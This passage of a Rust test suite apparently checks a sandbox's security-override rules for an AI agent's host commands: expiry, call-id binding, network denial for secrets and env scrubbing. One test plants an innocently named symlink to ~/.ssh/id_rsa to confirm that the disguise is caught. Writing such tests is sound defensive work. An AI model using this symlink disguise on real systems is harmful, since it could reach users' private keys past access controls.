            let audit = Arc::new(CapturingAudit::new());
            let (host, _h, rh, _w) = host_with_planted_home(Arc::clone(&audit)).await;
            let link = rh.join("innocent_link");
            std::os::unix::fs::symlink(rh.join(".ssh/id_rsa"), &link).expect("symlink");
            let ov = mk_override("c1", &link.to_string_lossy(), "general", VALID_EXPIRY);
            let req = req_override(ToolOrigin::OwnerInteractive, "c1", Some(ov));
            let d = host.evaluate_security_override(&req, IsolationMode::Host);
            // Re-derived as Secrets despite the innocent-looking link + advisory
            // "general": accepted as a Secrets unlock (network denied)…
            match &d {
                OverrideDecision::Relax(r) => assert!(r.deny_network, "must be Secrets tier"),
                other => panic!("expected Relax, got {other:?}"),
            }
            assert!(audit.snapshot()[0].reason.starts_with("accepted:secrets:"));
            // …but the ~/.ssh directory deny stays (only the exact leaf is removed).
            #[cfg(target_os = "macos")]
            {
                let input = host
                    .effective_tool_input(&req, IsolationMode::Host, &d)
                    .expect("input");
                let cmd = input
                    .get("command")
                    .and_then(Value::as_str)
                    .expect("command");
                let ssh_dir = rh.join(".ssh");
                assert!(
                    cmd.contains(&format!("(subpath \"{}\")", ssh_dir.display())),
                    "dir-secret must stay denied: {cmd}"
                );
            }
        }
    }

    #[tokio::test]
    async fn override_expired_rejected() {
        // L6: honored only while now_ms() <= expiry_ms. FixedClock now = NOW_MS.
        let audit = Arc::new(CapturingAudit::new());
        let (host, _h, rh, _w) = host_with_planted_home(Arc::clone(&audit)).await;
        let target = rh.join(".secrets");
        let ov = mk_override("c1", &target.to_string_lossy(), "secrets", NOW_MS - 1);
        let req = req_override(ToolOrigin::OwnerInteractive, "c1", Some(ov));
        let d = host.evaluate_security_override(&req, IsolationMode::Host);
        assert!(matches!(d, OverrideDecision::Rejected));
        assert_eq!(audit.snapshot()[0].reason, "reject_expired");
    }

    #[tokio::test]
    async fn override_call_id_mismatch_rejected() {
        // L7: the override must bind to THIS call's id — no cross-call reuse.
        let audit = Arc::new(CapturingAudit::new());
        let (host, _h, rh, _w) = host_with_planted_home(Arc::clone(&audit)).await;
        let target = rh.join(".secrets");
        let ov = mk_override(
            "some-other-call",
            &target.to_string_lossy(),
            "secrets",
            VALID_EXPIRY,
        );
        let req = req_override(ToolOrigin::OwnerInteractive, "c1", Some(ov));
        let d = host.evaluate_security_override(&req, IsolationMode::Host);
        assert!(matches!(d, OverrideDecision::Rejected));
        assert_eq!(audit.snapshot()[0].reason, "reject_call_id_mismatch");
    }

    #[tokio::test]
    async fn override_general_accept_relaxes_without_network_deny() {
        // General-tier unlock: accepted, deny_network = false (normal network kept).
        let audit = Arc::new(CapturingAudit::new());
        let (host, _h, rh, _w) = host_with_planted_home(Arc::clone(&audit)).await;
        let target = rh.join("notes.txt");
        let ov = mk_override("c1", &target.to_string_lossy(), "general", VALID_EXPIRY);
        let req = req_override(ToolOrigin::OwnerInteractive, "c1", Some(ov));
        let d = host.evaluate_security_override(&req, IsolationMode::Host);
        match &d {
            OverrideDecision::Relax(r) => {
                assert!(!r.deny_network, "General unlock keeps network");
                assert_eq!(
                    r.canonical_target,
                    std::fs::canonicalize(&target).expect("canon")
                );
            }
            other => panic!("expected Relax, got {other:?}"),
        }
        let row = &audit.snapshot()[0];
        assert_eq!(row.decision, AuditDecision::Allowed);
        assert!(
            row.reason.starts_with("accepted:general:"),
            "{}",
            row.reason
        );
    }

    #[tokio::test]
    async fn override_secrets_accept_sets_network_deny() {
        // Secrets-tier unlock: accepted, deny_network = true (L5).
        let audit = Arc::new(CapturingAudit::new());
        let (host, _h, rh, _w) = host_with_planted_home(Arc::clone(&audit)).await;
        let target = rh.join(".secrets");
        // Boundary-inclusive expiry (now == expiry) must still be honored.
        let ov = mk_override("c1", &target.to_string_lossy(), "general", NOW_MS);
        let req = req_override(ToolOrigin::OwnerInteractive, "c1", Some(ov));
        let d = host.evaluate_security_override(&req, IsolationMode::Host);
        match &d {
            OverrideDecision::Relax(r) => assert!(r.deny_network, "Secrets unlock denies network"),
            other => panic!("expected Relax, got {other:?}"),
        }
        assert!(audit.snapshot()[0].reason.starts_with("accepted:secrets:"));
    }

    /// L10 — env-scrub independence + real dispatch. On macOS, a valid Secrets unlock
    /// produces a wrapped Host-bash command that (a) STILL begins with the `env -i`
    /// scrub (the override never touches env scrubbing) and (b) denies network, and
    /// (c) with the override ABSENT the wrapped command is byte-identical minus the
    /// relaxation (drives the REAL `effective_tool_input` dispatch path).
    #[cfg(target_os = "macos")]
    #[tokio::test]
    async fn override_relax_keeps_env_scrub_and_denies_network_l10() {
        let audit = Arc::new(CapturingAudit::new());
        let (host, _h, rh, _w) = host_with_planted_home(Arc::clone(&audit)).await;
        let target = rh.join(".secrets");
        let ov = mk_override("c1", &target.to_string_lossy(), "secrets", VALID_EXPIRY);
        let req = req_override(ToolOrigin::OwnerInteractive, "c1", Some(ov));
        let d = host.evaluate_security_override(&req, IsolationMode::Host);
        assert!(matches!(d, OverrideDecision::Relax(_)));
        let relaxed = host
            .effective_tool_input(&req, IsolationMode::Host, &d)
            .expect("relaxed input");
        let relaxed_cmd = relaxed
            .get("command")
            .and_then(Value::as_str)
            .expect("command");
        // L10: env scrub is applied REGARDLESS of the override.
        assert!(
            relaxed_cmd.starts_with("/usr/bin/env -i "),
            "override must not skip env scrub: {relaxed_cmd}"
        );
        // L5: the Secrets unlock denies network.
        assert!(relaxed_cmd.contains("(deny network*)"), "{relaxed_cmd}");
        // The named secret is relaxed out of the read-deny set.
        assert!(
            !relaxed_cmd.contains(&format!("(subpath \"{}\")", target.display())),
            "target must be relaxed: {relaxed_cmd}"
        );

        // Absent override on the SAME request ⇒ the command still env-scrubs, keeps
        // the secret denied, and never denies network (Invariant F, byte-identical).
        let baseline = host
            .effective_tool_input(&req, IsolationMode::Host, &OverrideDecision::None)
            .expect("baseline input");
        let baseline_cmd = baseline
            .get("command")
            .and_then(Value::as_str)
            .expect("command");
        assert!(baseline_cmd.starts_with("/usr/bin/env -i "));
        assert!(!baseline_cmd.contains("(deny network*)"), "{baseline_cmd}");
        assert!(
            baseline_cmd.contains(&format!("(subpath \"{}\")", target.display())),
            "absent override must keep the secret denied: {baseline_cmd}"
        );
    }
}
